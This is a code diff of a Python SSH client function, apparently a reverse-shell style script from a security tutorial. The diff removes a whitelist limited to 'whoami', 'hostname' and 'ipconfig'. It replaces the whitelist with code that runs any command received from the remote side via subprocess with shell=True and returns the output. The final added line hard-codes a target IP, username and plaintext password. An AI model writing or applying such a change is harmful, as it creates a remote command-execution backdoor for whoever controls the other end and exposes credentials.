@@ -40,55 +40,21 @@ def ssh_command(ip, user, passwd, command):
                 break
 
             # Convert bytes -> string
-            received_command = data.decode(
+            command = data.decode(
                 "utf-8",
                 errors="replace"
             ).strip()
 
-            if received_command == "exit":
+            if command == "exit":
                 break
 
-            # For demonstration, only handle known commands.
-            commands = {
-                "whoami": ["whoami"],
-                "hostname": ["hostname"],
-                "ipconfig": ["ipconfig"]
-            }
+            try: 
+                cmd_ouput = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_ouput)
+            except Exception as e :
+                ssh_session.send(str(e))
+        client.close()
 
-            if received_command not in commands:
-                ssh_session.send(
-                    b"Command not supported"
-                )
-                continue
-
-            try:
-                result = subprocess.run(
-                    commands[received_command],
-                    capture_output=True,
-                    text=True,
-                    check=False
-                )
-
-                output = result.stdout + result.stderr
-
-                # Python 3: string -> bytes
-                ssh_session.send(
-                    output.encode("utf-8")
-                )
-
-            except Exception as e:
-                error = str(e)
-
-                ssh_session.send(
-                    error.encode("utf-8")
-                )
-
-    client.close()
+ssh_command("192.168.193.1","mokht","hello@44","hostname")
 
 
-ssh_command(
-    "*",
-    "*",
-    "*",
-    "ClientConnected"
-)
